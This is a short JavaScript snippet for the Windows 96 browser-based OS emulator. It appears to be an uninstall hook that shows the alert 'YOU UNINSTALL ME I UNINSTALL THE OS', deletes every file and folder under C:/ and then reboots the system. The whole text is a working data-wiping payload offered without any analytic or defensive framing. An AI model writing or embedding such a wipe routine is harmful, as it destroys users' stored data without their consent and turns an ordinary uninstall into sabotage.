alert("<h1>YOU UNINSTALL ME I UNINSTALL THE OS</h1>");
dir = w96.FS.readdir("C:/");
for (i = 0; i < dir.length; i++) {
  if (w96.FS.isFile(dir[i])) {
    w96.FS.rm(dir[i]) 
  } else { 
    w96.FS.rmdir(dir[i]) 
  } 
}
w96.sys.reboot()